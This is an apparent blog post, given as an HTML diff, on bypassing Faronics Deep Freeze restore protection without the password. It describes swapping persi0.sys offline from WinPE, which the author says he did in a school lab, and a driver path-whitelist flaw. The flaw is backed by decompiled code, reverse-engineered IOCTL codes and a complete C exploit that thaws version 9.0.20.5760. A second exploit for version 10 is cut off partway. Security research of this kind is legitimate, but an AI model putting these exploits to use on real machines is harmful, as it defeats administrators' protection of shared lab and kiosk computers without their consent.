@@ -1,0 +1,902 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+    
+      <link rel="alternate" hreflang="en" href="https://blog.junyu33.me/en/2026/09/28/deepfrz/">
+    
+  
+
+  <link rel="stylesheet" href="/vendor/highlight/github.min.css">
+
+  <!-- RSS / Atom -->
+  
+  <link rel="alternate" type="application/atom+xml" title="RSS" href="/zh/atom.xml">
+
+  <script defer src="/vendor/highlight/highlight.min.js"></script>
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  <title>Deep Freeze 忘了密码怎么解冻？ | 现充|junyu33</title>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div class="head-nav">
+        <div class="inner">
+                <a href="/">
+                        现充|junyu33
+                </a>
+                <div class="right">
+                        
+                                <a href="/zh">首页</a>
+                                <a href="/zh/archives">归档</a>
+                                
+                                        <a href="/zh/categories">分类</a>
+                                
+                                
+                                        <a href="/zh/tags">标签</a>
+                                
+                                <a href="/">English</a>
+                                <a id="mirror-switch" data-lang="zh" target="_blank" rel="noopener" href="https://blog-cn.junyu33.me/">国内镜像</a>
+                        
+                </div>
+        </div>
+</div>
+
+  <div class="main">
+    <div class="post">
+    
+      <nav class="lang-switch" role="navigation" aria-label="Language switch">
+        
+          <a class="lang-pill"
+             href="/en/2026/09/28/deepfrz/"
+             hreflang="en">
+            <span class="lang-label">English</span>
+          </a>
+        
+      </nav>
+    
+
+	<h1>Deep Freeze 忘了密码怎么解冻？</h1>
+	<p>11 年前，也就是自己六年级的时候，我绕过了 Deep Freeze 的还原保护。</p>
+<p>11 年后，Deep Freeze 居然只更新了两个大版本。现在心血来潮又试了一下，发现自己当年的方法仍然健在，并且还有了新的思路。这篇文章针对的两个版本是：</p>
+<ul>
+<li>Standard 最新版本 9.0.20.5760</li>
+<li>企业版第二新的版本 10.10.220.5788（几天前刚出了 10.20，但貌似目前还拿不到）</li>
+</ul>
+<p>方法在自己的 win7 虚拟机测试，两个版本均通过。仅供个人学习交流使用。</p>
+<span id="more"></span>
+<h2 id="替换-persi0-sys">替换 persi0.sys</h2>
+<blockquote>
+<p>需要 U 盘 physical access，进入 winPE。</p>
+</blockquote>
+<p>这是我当年偷偷跑到学校机房实施的办法。步骤如下：</p>
+<ol>
+<li>记住学校机房里安装的 Deep Freeze 的版本号，并在另一条设备开虚拟机下载、安装相同版本的 Deep Freeze，设置并牢记自己的密码。</li>
+<li>重启之后，在 PE 环境将 C 盘根目录的 persi0.sys 拷贝进 U 盘（因为正在运行中的系统无法拷贝，必须离线）。</li>
+<li>到了微机课的时候，使用自己的 PE 启动盘进入 PE 环境，将 persi0.sys 覆盖对应的 C 盘根目录文件。</li>
+<li>下次重启到原来的系统，Ctrl+Alt+Shift+F6，输入原来的密码解锁，选择解冻，再次重启即可用原来的安装包卸载。</li>
+</ol>
+<p>这个方法的重要前提是——当时机房 BIOS 没有密码。</p>
+<p>至于官方修复方面，这个方法在 8.35 及其之前都仍然有效。2017/02 官方推出了 8.37，有了完整性校验，按照这个步骤会导致 Deep Freeze 的图标消失。虽然软件坏了，但系统实际上处于解冻状态，直接用对应安装包卸载即可。</p>
+<p>到了最新版本 9.0.20.5760，完整性校验似乎又没了。我亲自开了两个 vmware 虚拟机，（注意不是克隆，<code>vol C:</code> 输出不同，机器指纹应该不一样），我观察到了两个现象：</p>
+<ol>
+<li>给这两个系统的 Deep Freeze 设置相同的密码，PE 导出后，diff 检查逐字节一致。</li>
+<li>假如虚拟机 A 和虚拟机 B 的密码不同，将 B 的 persi0.sys 替换 A 的那个版本，之后在虚拟机 A 使用 B 的密码也可以登录成功。</li>
+</ol>
+<p>事后的逆向分析也证明驱动完全不验签，但应用态的 <code>FrzState2k.exe</code> 内部嵌着一把 base64 RSA 公钥。格式为 X.509 SubjectPublicKeyInfo 的 RSA 3072，具体内容如下：</p>
+<pre><code>MIIBoDANBgkqhkiG9w0BAQEFAAOCAY0AMIIBiAKCAYEA2RePUsV+NetwZuAWHMOmEjzUrXOFHsAG3YL2vy/PBt1CsIOXeUPb+KgOtFJN2rfbvgULnQmI50GK7lF+J6za9TUP6QAAWKlkc2XO1BbiGD9O83g9Vcw8dZwbKZbRmEEnQoYALfQaXdIg8ehHGgLT4K8b9C3cPklNNQUpgazrj5Xrdbu+EuwTfoW1mc3SfJkWZBLWiPPiHjd1xzxtiVhO/D+ANNMWsL8D/yQTwvg6vkLOIUR2M/MLqDBAgB309/XtPsJQ9WIVJxSMd+Fj+DVTbJtJd1V/usttlK54/4wY63mHXO38oNZV1tMKRHlYpvXoGFAtFiTBCf1LAlHUN0Q/qtHfbYxFc60Jbdgqgb+SEFETNXQIHSlmGAN66DZauesdrADri1fIc2O+Bzzz8c9bTDcdu4x6whDwU+2BL8qszORIWiECU4z57w7N22fnLAE1Z8+RrJq/7dLgZNFBxZEexM2hfhTz40vIWfhD5En+WwZUa+vEud4DIPqu8Ltq9NZZAgER
+</code></pre>
+<p>基于对密码学的基本信任，我认为单从 persi0.sys 还原密码明文，基本上不可能了。</p>
+<h2 id="白名单路径-impersonate">白名单路径 impersonate</h2>
+<blockquote>
+<p>只需有当前电脑的管理员权限即可。</p>
+</blockquote>
+<p>静态分析得到的最重要的漏洞就是，程序运行的是白名单正则匹配的，具体而言，匹配方式为：</p>
+<pre><code>*\WINDOWS\SYSTEM32\DFC.EXE*
+*\WINDOWS\SYSWOW64\DFC.EXE*
+*\FARONICS\DEEP FREEZE\INSTALL C-0\DFSERV.EXE*
+*\FARONICS\DEEP FREEZE\INSTALL C-0\_$DF\FRZSTATE2K.EXE*
+</code></pre>
+<p>这意味着你只要编写一个形如 <code>DFServ.exe.20260928.exe</code>，并放在 <code>Install C-0</code> 这个目录，你就相当于获得了与 <code>DFServ.exe</code> 等这些程序相同的身份。</p>
+<p>这个版本对 9.0.20.5760 和 10.10.220.5788 都适用，绕过思路基本一致，只是官方的参数调整让实现细节有所区别。</p>
+<h3 id="9-0-20-5760">9.0.20.5760</h3>
+<p>这里重点说一下白名单校验是怎么来的。首先驱动 <code>deepfrz.sys</code> 在哪些地方用了 <code>ZwQueryInformationProcess</code> API，看一下 Xref：</p>
+<p><img src="image.png" alt="alt text"></p>
+<p>查看 <code>sub_140007A8C</code>，F5 反编译如下：</p>
+<pre><code class="language-c">__int64 __fastcall sub_140007A8C(__int64 a1, _QWORD *a2)
+&#123;
+  NTSTATUS InformationProcess; // eax
+  PVOID PoolWithTag; // rbx
+  NTSTATUS v6; // edi
+  SIZE_T NumberOfBytes; // [rsp+48h] [rbp+10h] BYREF
+
+  LODWORD(NumberOfBytes) = 0;
+  *a2 = 0;
+  InformationProcess = ZwQueryInformationProcess(
+                         ProcessHandle: (HANDLE)0xFFFFFFFFFFFFFFFFLL,
+                         ProcessInformationClass: ProcessImageFileName,
+                         ProcessInformation: nullptr,
+                         ProcessInformationLength: 0,
+                         ReturnLength: (PULONG)&amp;NumberOfBytes);
+  if ( (_DWORD)NumberOfBytes == 0 || InformationProcess != 0xC0000004 )
+    return 0xC0000001LL;
+  PoolWithTag = ExAllocatePoolWithTag(PoolType: PagedPool, (unsigned int)NumberOfBytes, Tag: 0x636F7250u);
+  if ( PoolWithTag == nullptr )
+    return 3221225626LL;
+  v6 = ZwQueryInformationProcess(
+         ProcessHandle: (HANDLE)0xFFFFFFFFFFFFFFFFLL,
+         ProcessInformationClass: ProcessImageFileName,
+         ProcessInformation: PoolWithTag,
+         ProcessInformationLength: NumberOfBytes,
+         ReturnLength: (PULONG)&amp;NumberOfBytes);
+  if ( v6 &lt; 0 )
+  &#123;
+    _mm_lfence();
+    ExFreePoolWithTag(P: PoolWithTag, Tag: 0);
+  &#125;
+  else
+  &#123;
+    *a2 = PoolWithTag;
+  &#125;
+  return (unsigned int)v6;
+&#125;
+</code></pre>
+<p>看看父函数 <code>sub_1400073F0</code>，程序在经历上面的 <code>sub_140007A8C</code> 之后，来到了 <code>sub_1400179E8</code>（也就是 <code>FsRtlIsNameInExpression</code>）：</p>
+<pre><code class="language-c">      if ( v5 == 468200 )
+      &#123;
+        P = nullptr;
+        if ( (int)sub_140007A8C(a1, a2: &amp;P) &gt;= 0 )
+        &#123;
+          v22 = 0;
+          while ( 1 )
+          &#123;
+            v24 = 0;
+            RtlInitUnicodeString(&amp;DestinationString, SourceString: off_140029000[v22]);
+            if ( (unsigned __int8)sub_1400179E8(a1: P, a2: &amp;DestinationString) == 1 )
+              break;
+            if ( DestinationString.Buffer != nullptr &amp;&amp; v24 != 0 )
+              sub_1400124F0(a1: DestinationString.Buffer, a2: 2);
+            if ( (unsigned __int64)++v22 &gt;= 4 )
+              goto LABEL_121;
+          &#125;
+          if ( DestinationString.Buffer != nullptr &amp;&amp; v24 != 0 )
+            sub_1400124F0(a1: DestinationString.Buffer, a2: 2);
+LABEL_121:
+          ExFreePoolWithTag(P, Tag: 0);
+          if ( v22 == 4 )
+          &#123;
+            v14 = -1073741790;
+            goto LABEL_51;
+          &#125;
+        &#125;
+      &#125;
+      a2 = v4;
+</code></pre>
+<p>于是我们应该关心 <code>off_140029000</code> 常量，因为根据业务逻辑，这段附近肯定涉及到白名单匹配，打开一看：</p>
+<pre><code>.data:0000000140029000 off_140029000   dq offset aWindowsSystem3
+.data:0000000140029000                                         ; DATA XREF: sub_1400073F0:loc_14000782A↑o
+.data:0000000140029000                                         ; &quot;*\\WINDOWS\\SYSTEM32\\DFC.EXE*&quot;
+.data:0000000140029008                 dq offset aWindowsSyswow6 ; &quot;*\\WINDOWS\\SYSWOW64\\DFC.EXE*&quot;
+.data:0000000140029010                 dq offset aFaronicsDeepFr ; &quot;*\\FARONICS\\DEEP FREEZE\\INSTALL C-0\\&quot;...
+.data:0000000140029018                 dq offset aFaronicsDeepFr_0 ; &quot;*\\FARONICS\\DEEP FREEZE\\INSTALL C-0\\&quot;...
+</code></pre>
+<p>双击跳转到对应 offset，前面的 claim 就被证实了：</p>
+<pre><code>.rdata:00000001400257C0 aWindowsSystem3:                        ; DATA XREF: .data:off_140029000↓o
+.rdata:00000001400257C0                 text &quot;UTF-16LE&quot;, '*\WINDOWS\SYSTEM32\DFC.EXE*',0
+.rdata:00000001400257F8 aWindowsSyswow6:                        ; DATA XREF: .data:0000000140029008↓o
+.rdata:00000001400257F8                 text &quot;UTF-16LE&quot;, '*\WINDOWS\SYSWOW64\DFC.EXE*',0
+.rdata:0000000140025830 aFaronicsDeepFr:                        ; DATA XREF: .data:0000000140029010↓o
+.rdata:0000000140025830                 text &quot;UTF-16LE&quot;, '*\FARONICS\DEEP FREEZE\INSTALL C-0\DFSERV.EXE*',0
+.rdata:000000014002588E                 align 10h
+.rdata:0000000140025890 aFaronicsDeepFr_0:                      ; DATA XREF: .data:0000000140029018↓o
+.rdata:0000000140025890                 text &quot;UTF-16LE&quot;, '*\FARONICS\DEEP FREEZE\INSTALL C-0\_$DF\FRZSTATE2K.'
+.rdata:00000001400258F6                 text &quot;UTF-16LE&quot;, 'EXE*',0
+</code></pre>
+<p>之后就是看如何与驱动交互。这里就让 LLM 代劳了，对应的函数是：</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>要逆出的量</th>
+<th>IDA 位置</th>
+<th>给出报文里的</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>IOCTL 码表 + 分派链</td>
+<td><code>sub_1400073F0</code> → <code>sub_140001060</code> → <code>sub_140008D18</code>（减法链）</td>
+<td>4 个码 <code>0x724E8</code> / <code>0x7207C</code> / <code>0x72024</code> / <code>0x72094</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>两个查询的调用约定</td>
+<td><code>sub_140007B48</code>、<code>sub_140007BB8</code></td>
+<td>id、type1（输入 NULL、输出 4、不解包）</td>
+</tr>
+<tr>
+<td>3</td>
+<td>两段式读取</td>
+<td><code>sub_140009C78</code> → <code>sub_140022B4C</code> / <code>sub_140022E18</code></td>
+<td>N + 记录本体（原样带回）</td>
+</tr>
+<tr>
+<td>4</td>
+<td>记录的字段约束</td>
+<td><code>sub_14000AB28</code>（<code>+2</code>/<code>+0xD4</code> 校验）、<code>sub_140023780</code>（3221 B）</td>
+<td><code>+0x02 = 0x1712</code>、<code>+0xD4 = id</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td>提交只采纳哪两个字段</td>
+<td><code>sub_14000AB28(mode 4)</code> 克隆链（<code>sub_1400124D0</code>→<code>sub_1400063E8</code>→<code>sub_140023780</code>→<code>sub_140003650</code>）</td>
+<td><code>+0x04 = 1</code>、<code>+0x72 = 7</code></td>
+</tr>
+<tr>
+<td>6</td>
+<td>trailer 字段与取值</td>
+<td>模板 <code>byte_8772FC</code> + <code>sub_4BC984</code>/<code>sub_4BCAEC</code>/<code>sub_4BC350</code>；<code>sub_140022B74</code>、<code>sub_140022BAC</code></td>
+<td><code>+0x00/+0x82/+0x8A/+0x8E</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td>内层变换与作用范围</td>
+<td><code>sub_14000FFEC</code> ≡ <code>sub_4DBCDC</code></td>
+<td><code>^0xC0</code>，只前 <code>min(len,0x3000)</code></td>
+</tr>
+<tr>
+<td>8</td>
+<td>外层尾布局与魔数</td>
+<td><code>sub_4BE1DC</code> ↔ <code>sub_1400010DC</code>；魔数 <code>cmp [rbx+0Ch],6789DEDCh</code></td>
+<td><code>[id][0x6789DEDC][12]</code></td>
+</tr>
+<tr>
+<td>9</td>
+<td>外层变换、递推、种子、窗口</td>
+<td><code>sub_4A7ED8</code>+<code>sub_4A7F14</code>+<code>sub_4A7F54</code> ↔ <code>sub_14000B7F4</code>+<code>sub_14000B724(&amp;ctx,60)</code></td>
+<td>逆序 XOR、<code>s^(k+3)</code>、<code>181/163</code>、秒种子、窗口 60</td>
+</tr>
+<tr>
+<td>10</td>
+<td>提交语义与长度约束</td>
+<td><code>sub_14000AB28(mode 4)</code>；<code>sub_140001B38</code>（<code>v8 == a4</code> 才写）</td>
+<td>长度恰好等于 slot 长度；成功 = 返回 N</td>
+</tr>
+</tbody>
+</table>
+<p>知道了这些信息，我们就开始写 PoC 了：</p>
+<pre><code class="language-c">/* DeepFrz.sys 9.00.020.5760, exact SHA-256 pinned below.
+ * Static-analysis PoC. Never run by the authoring session.
+ * No CRT, no reboot, no 0x72028, no retry of the write request.
+ * Run only when explicitly ready: thaw_once.exe --thaw-once
+ */
+#define WIN32_LEAN_AND_MEAN
+#define _WIN32_WINNT 0x0601
+#include &lt;windows.h&gt;
+#include &lt;wincrypt.h&gt;
+#include &lt;shellapi.h&gt;
+
+#define IO_READ       0x00072024u
+#define IO_COMMIT     0x00072094u
+#define IO_TYPE1      0x0007207Cu
+#define IO_RECORD_ID  0x000724E8u
+#define MAX_RECORD    0xBADBu
+#define MIN_RECORD    (637u + 3221u)
+#define TAIL_SIZE     146u
+#define OUTER_SIZE    12u
+
+static const BYTE expected_sha256[32] = &#123;
+    0xC4,0xB9,0xE8,0x41,0xA6,0x79,0x8A,0x47,
+    0x40,0xB1,0xAA,0x01,0x4B,0x03,0x3A,0x2E,
+    0x86,0x4D,0xF6,0x65,0xC1,0xDB,0x6B,0x67,
+    0x9F,0x31,0xBC,0x8D,0x77,0xDB,0xB7,0x3F
+&#125;;
+
+static DWORD length(const char *s) &#123; DWORD n=0; while(s[n]) ++n; return n; &#125;
+static void say(const char *s) &#123;
+    DWORD n;
+    WriteFile(GetStdHandle(STD_OUTPUT_HANDLE),s,length(s),&amp;n,NULL);
+&#125;
+static void hex32(DWORD v) &#123;
+    char s[11]; DWORD i;
+    s[0]='0'; s[1]='x'; s[10]=0;
+    for(i=0;i&lt;8;++i) s[9-i]=&quot;0123456789ABCDEF&quot;[(v&gt;&gt;(4*i))&amp;15u];
+    say(s);
+&#125;
+static BOOL equal_w(const WCHAR *a,const WCHAR *b) &#123;
+    while(*a &amp;&amp; *a==*b) &#123; ++a; ++b; &#125; return *a==*b;
+&#125;
+static BYTE *allocate(DWORD n) &#123;
+    return (BYTE*)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,n);
+&#125;
+static void release(void *p) &#123; if(p) HeapFree(GetProcessHeap(),0,p); &#125;
+static DWORD get32(const BYTE *p) &#123;
+    return (DWORD)p[0]|((DWORD)p[1]&lt;&lt;8)|((DWORD)p[2]&lt;&lt;16)|((DWORD)p[3]&lt;&lt;24);
+&#125;
+static WORD get16(const BYTE *p) &#123; return (WORD)(p[0]|((WORD)p[1]&lt;&lt;8)); &#125;
+static void put32(BYTE *p,DWORD n) &#123;
+    p[0]=(BYTE)n; p[1]=(BYTE)(n&gt;&gt;8); p[2]=(BYTE)(n&gt;&gt;16); p[3]=(BYTE)(n&gt;&gt;24);
+&#125;
+static void put16(BYTE *p,WORD n) &#123; p[0]=(BYTE)n; p[1]=(BYTE)(n&gt;&gt;8); &#125;
+static void copy_bytes(BYTE *d,const BYTE *s,DWORD n) &#123;
+    DWORD i; for(i=0;i&lt;n;++i) d[i]=s[i];
+&#125;
+
+/* Check the on-disk driver before opening the volume. Does not prove the
+ * loaded kernel image matches a subsequently replaced on-disk file. */
+static BOOL verify_target(void) &#123;
+    OSVERSIONINFOA os=&#123;0&#125;;
+    char path[MAX_PATH];
+    const char suffix[]=&quot;\\drivers\\DeepFrz.sys&quot;;
+    HCRYPTPROV provider=0; HCRYPTHASH hash=0;
+    HANDLE file=INVALID_HANDLE_VALUE;
+    BYTE digest[32]; BYTE *chunk=NULL;
+    DWORD n,i,read_n,digest_n=32; BOOL ok=FALSE;
+    LARGE_INTEGER size;
+    if(sizeof(void*)!=8) &#123; say(&quot;This PoC requires x64.\r\n&quot;); return FALSE; &#125;
+    os.dwOSVersionInfoSize=sizeof(os);
+    if(!GetVersionExA(&amp;os) || os.dwMajorVersion!=6 || os.dwMinorVersion!=1) &#123;
+        say(&quot;Refusing: expected Windows 7 / NT 6.1.\r\n&quot;); return FALSE;
+    &#125;
+    n=GetSystemDirectoryA(path,MAX_PATH);
+    if(!n || n&gt;=MAX_PATH || (path[0]!='C' &amp;&amp; path[0]!='c') || path[1]!=':') &#123;
+        say(&quot;Refusing: expected the analyzed C: system volume.\r\n&quot;); return FALSE;
+    &#125;
+    if(n+sizeof(suffix)&gt;MAX_PATH) return FALSE;
+    for(i=0;i&lt;sizeof(suffix);++i) path[n+i]=suffix[i];
+    file=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
+    if(file==INVALID_HANDLE_VALUE) goto done;
+    if(!GetFileSizeEx(file,&amp;size) || size.QuadPart!=203832) goto done;
+    if(!CryptAcquireContextA(&amp;provider,NULL,NULL,PROV_RSA_AES,CRYPT_VERIFYCONTEXT)) goto done;
+    if(!CryptCreateHash(provider,CALG_SHA_256,0,0,&amp;hash)) goto done;
+    chunk=allocate(4096);
+    if(!chunk) goto done;
+    for(;;) &#123;
+        if(!ReadFile(file,chunk,4096,&amp;read_n,NULL)) goto done;
+        if(!read_n) break;
+        if(!CryptHashData(hash,chunk,read_n,0)) goto done;
+    &#125;
+    if(!CryptGetHashParam(hash,HP_HASHVAL,digest,&amp;digest_n,0) || digest_n!=32) goto done;
+    for(i=0;i&lt;32;++i) if(digest[i]!=expected_sha256[i]) goto done;
+    ok=TRUE;
+done:
+    release(chunk);
+    if(hash) CryptDestroyHash(hash);
+    if(provider) CryptReleaseContext(provider,0);
+    if(file!=INVALID_HANDLE_VALUE) CloseHandle(file);
+    if(!ok) say(&quot;Refusing: driver size/hash verification failed.\r\n&quot;);
+    return ok;
+&#125;
+
+/* Exactly the observed volume-open parameters. Reopen for each request,
+ * as DFServ does. No alternate device and no write-request retry. */
+static BOOL ioctl(DWORD code,BYTE *input,DWORD in_n,BYTE *output,DWORD out_n,DWORD *returned) &#123;
+    HANDLE h=CreateFileA(&quot;\\\\.\\C:&quot;,0,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
+    BOOL ok; DWORD error;
+    *returned=0;
+    if(h==INVALID_HANDLE_VALUE) &#123;
+        say(&quot;CreateFile failed: &quot;); hex32(GetLastError()); say(&quot;\r\n&quot;); return FALSE;
+    &#125;
+    ok=DeviceIoControl(h,code,input,in_n,output,out_n,returned,NULL);
+    error=ok?0:GetLastError();
+    CloseHandle(h);
+    if(!ok) &#123;
+        say(&quot;DeviceIoControl &quot;); hex32(code); say(&quot; failed: &quot;); hex32(error); say(&quot;\r\n&quot;);
+    &#125;
+    return ok;
+&#125;
+
+/* 140007B48 / 140007BB8 require SystemBuffer and output length exactly 4.
+ * They do not read/decode input. The I/O manager supplies SystemBuffer
+ * from OutputBufferLength=4 even when input is NULL. */
+static BOOL query_dword(DWORD code,DWORD *value) &#123;
+    BYTE out[4]=&#123;0&#125;; DWORD returned;
+    if(!ioctl(code,NULL,0,out,4,&amp;returned) || returned!=4) return FALSE;
+    *value=get32(out); return TRUE;
+&#125;
+
+/* 4BE1DC / 4A7ED8, matched against 1400010DC / 14000B7F4.
+ * Fresh UTC seconds for every request; no timestamp copied from DFTime. */
+static BYTE *wrap(const BYTE *plain,DWORD n,DWORD id,DWORD *wire_n) &#123;
+    FILETIME ft; ULARGE_INTEGER t;
+    ULONGLONG seconds;
+    DWORD k,total=n+OUTER_SIZE;
+    WORD state;
+    BYTE *wire=allocate(total);
+    if(!wire) return NULL;
+    copy_bytes(wire,plain,n);
+    put32(wire+n,id); put32(wire+n+4,0x6789DEDCu); put32(wire+n+8,OUTER_SIZE);
+    GetSystemTimeAsFileTime(&amp;ft);
+    t.LowPart=ft.dwLowDateTime; t.HighPart=ft.dwHighDateTime;
+    if(t.QuadPart&lt;116444736000000000ULL) &#123; release(wire); return NULL; &#125;
+    seconds=(t.QuadPart-116444736000000000ULL)/10000000ULL;
+    if(seconds&gt;0x7FFFFFFFULL) &#123; release(wire); return NULL; &#125;
+    state=(WORD)seconds;
+    for(k=0;k&lt;total;++k) &#123;
+        state=(WORD)(2u*((DWORD)state/181u)-163u*((DWORD)state%181u));
+        wire[total-1-k]^=(BYTE)((BYTE)state^(BYTE)(k+3u));
+    &#125;
+    *wire_n=total; return wire;
+&#125;
+
+static BOOL read_slot0(DWORD id,BYTE *out,DWORD out_n,DWORD *returned) &#123;
+    BYTE index[4]=&#123;0&#125;; DWORD wire_n=0;
+    BYTE *wire=wrap(index,4,id,&amp;wire_n); BOOL ok;
+    if(!wire) return FALSE;
+    ok=ioctl(IO_READ,wire,wire_n,out,out_n,returned);
+    release(wire); return ok;
+&#125;
+
+static DWORD thaw_once(void) &#123;
+    DWORD id,key,n,returned,wire_n,i,plain_n;
+    BYTE size_bytes[4]=&#123;0&#125;; BYTE *record=NULL,*plain=NULL,*wire=NULL;
+    DWORD result=1;
+    if(!verify_target()) return 1;
+    if(!query_dword(IO_RECORD_ID,&amp;id) || !query_dword(IO_TYPE1,&amp;key)) return 1;
+    if(!read_slot0(id,size_bytes,4,&amp;returned) || returned!=4) return 1;
+    n=get32(size_bytes);
+    /* Bounds cover the subregion the handler itself copies and the
+     * maximum clone allocation in this exact driver. Do not guess N. */
+    if(n&lt;MIN_RECORD || n&gt;MAX_RECORD) &#123;
+        say(&quot;Refusing unexpected record length: &quot;); hex32(n); say(&quot;\r\n&quot;); return 1;
+    &#125;
+    record=allocate(n);
+    if(!record || !read_slot0(id,record,n,&amp;returned) || returned!=n) goto done;
+    if(get16(record)!=n || get16(record+2)!=0x1712 || get32(record+0xD4)!=id) &#123;
+        say(&quot;Refusing inconsistent record header/id.\r\n&quot;); goto done;
+    &#125;
+    plain_n=n+TAIL_SIZE;
+    plain=allocate(plain_n);
+    if(!plain) goto done;
+    copy_bytes(plain,record,n);
+    put32(plain+0x04,1);          /* one thawed initialization interval */
+    put16(plain+0x72,7);          /* DFServ RebootThawed operation */
+    put32(plain+n+0x00,key);      /* from 0x7207C, NOT readback +0x289 */
+    put32(plain+n+0x82,1);        /* type-1 validation */
+    put32(plain+n+0x8A,0);        /* slot 0 */
+    put32(plain+n+0x8E,TAIL_SIZE);
+    /* All remaining trailer bytes are zero, as in DFServ. */
+    for(i=0;i&lt;plain_n &amp;&amp; i&lt;0x3000u;++i) plain[i]^=0xC0;
+    wire=wrap(plain,plain_n,id,&amp;wire_n);
+    if(!wire) goto done;
+    say(&quot;Submitting ONE 0x72094 request (count=1, operation=7).\r\n&quot;);
+    if(!ioctl(IO_COMMIT,wire,wire_n,NULL,0,&amp;returned)) &#123;
+        say(&quot;Write outcome is not confirmed; do not assume nothing changed. No retry was made.\r\n&quot;);
+        goto done;
+    &#125;
+    if(returned!=n) &#123;
+        say(&quot;Unexpected completion length; write may have occurred. No retry was made.\r\n&quot;);
+        goto done;
+    &#125;
+    say(&quot;Driver reported success. No reboot was requested. Actual thaw state is not verified.\r\n&quot;);
+    result=0;
+done:
+    release(wire); release(plain); release(record);
+    return result;
+&#125;
+
+/* Custom PE entry point keeps the executable independent of UCRT/.NET. */
+void entry(void) &#123;
+    int argc=0; DWORD result=2;
+    WCHAR **argv=CommandLineToArgvW(GetCommandLineW(),&amp;argc);
+    if(argv &amp;&amp; argc==2 &amp;&amp; equal_w(argv[1],L&quot;--thaw-once&quot;)) result=thaw_once();
+    else say(&quot;Version-pinned static-analysis PoC.\r\nUsage: thaw_once.exe --thaw-once\r\nNo device calls made without that argument. No automatic reboot.\r\n&quot;);
+    if(argv) LocalFree(argv);
+    ExitProcess(result);
+&#125;
+</code></pre>
+<h3 id="10-10-220-5788">10.10.220.5788</h3>
+<p>v10 的版本在 v9 基础上，白名单本身是没有变化的，驱动确实改了不少：</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>项</th>
+<th>v9</th>
+<th>v10</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>记录 id 查询码</td>
+<td><code>0x724E8</code></td>
+<td><code>0x724E4</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>长度/读取码</td>
+<td><code>0x72024</code></td>
+<td><code>0x72020</code>（<code>0x72024</code> 改成&quot;写模式 0 预检&quot;）</td>
+</tr>
+<tr>
+<td>3</td>
+<td>提交 mode</td>
+<td><code>0x72094</code> ⇒ <strong>mode 4</strong></td>
+<td><code>0x72094</code> ⇒ <strong>mode 3</strong></td>
+</tr>
+<tr>
+<td>4</td>
+<td>trailer 首 dword</td>
+<td>type-1 值（记录 <code>+0x289</code>，由 <code>0x7207C</code> 取）→ 源码 <code>put32(plain+n+0x00,key)</code></td>
+<td>记录 id → 源码 <code>put32(payload+n+0x00,id)</code>（<code>key</code> 查了只打印）</td>
+</tr>
+<tr>
+<td>5</td>
+<td>内层变换</td>
+<td>内联 <code>p[i]^=0xC0</code></td>
+<td><code>inner_transform()</code>：<code>p[i]^=i^(0xBC+i)</code></td>
+</tr>
+<tr>
+<td>6</td>
+<td>外层魔数</td>
+<td><code>0x6789DEDC</code></td>
+<td><code>0x6789EFDC</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td>外层递推</td>
+<td><code>state=2*(state/181)-163*(state%181)</code></td>
+<td><code>2060591247</code> 魔数除法实现的 <code>173/137</code> 版</td>
+</tr>
+</tbody>
+</table>
+<p>具体细节这里就不赘述了，PoC 如下：</p>
+<pre><code class="language-c">/* DeepFrz.sys 10.10.220.5788, exact SHA-256 pinned below.
+ * v11 candidate: corrected v10 protocol port. Static-analysis derived; the
+ * authoring session did NOT run it.
+ *
+ * Corrections versus poc\thaw_once_v10_candidate.c, both proven from the
+ * v10 driver and from the UPX-unpacked v10 DFServ.exe:
+ *
+ *  1. 0x72024 is NOT the length query in v10. Sending a 4-byte payload to
+ *     0x72024 makes sub_14000ADE8's trailer parser sub_140022E54 return NULL
+ *     (it requires payloadLen &gt;= 0x92 and u32@(payload+payloadLen-4) == 146),
+ *     so the handler takes LABEL_49 and completes with STATUS_INVALID_PARAMETER
+ *     (0xC000000D) -&gt; Win32 ERROR_INVALID_PARAMETER (0x57), exactly the observed
+ *     failure. The length query / record read moved to 0x72020.
+ *  2. The inner payload transform is not a flat XOR 0xC0. v10 uses
+ *     payload[i] ^= (BYTE)i ^ (BYTE)(0xBC + i) for i &lt; min(len,0x3000)
+ *     (driver sub_1400102C0, DFServ sub_4DC0FC -- identical).
+ *
+ * No CRT, no reboot, no retry. Run only when explicitly ready:
+ *   thaw_once_v11_candidate.exe --thaw-once
+ */
+#define WIN32_LEAN_AND_MEAN
+#define _WIN32_WINNT 0x0601
+#include &lt;windows.h&gt;
+#include &lt;wincrypt.h&gt;
+#include &lt;shellapi.h&gt;
+
+/* v10 request codes, each traced to its handler in DeepFrz.sys 10.10.220.5788:
+ *   0x72020 -&gt; worker sub_140008D28 -&gt; sub_140009C88  length query / record read
+ *   0x72024 -&gt; worker sub_140008D28 -&gt; sub_14000ADE8 mode 0  read w/ trailer
+ *   0x7208C -&gt; worker sub_140008D28 -&gt; sub_14000ADE8 mode 2
+ *   0x72094 -&gt; worker sub_140008D28 -&gt; sub_14000ADE8 mode 3  commit
+ *   0x7207C -&gt; pre-dispatch sub_140007400 (unpacked, needs OutputBufferLength&gt;=4)
+ *   0x724E4 -&gt; worker sub_140007B58 (unpacked, needs OutputBufferLength==4)
+ */
+#define IO_META       0x00072020u
+#define IO_READ       0x00072024u
+#define IO_COMMIT     0x00072094u
+#define IO_TYPE1      0x0007207Cu
+#define IO_RECORD_ID  0x000724E4u
+
+/* DFServ v10 rejects Size &gt; 0xB9BB (sub_4BC6D8). The driver's own memcpy of
+ * 3221 bytes at record+637 needs N &gt;= 637+3221. */
+#define MAX_RECORD    0xB9BBu
+#define MIN_RECORD    (637u + 3221u)
+#define TAIL_SIZE     146u
+#define OUTER_SIZE    12u
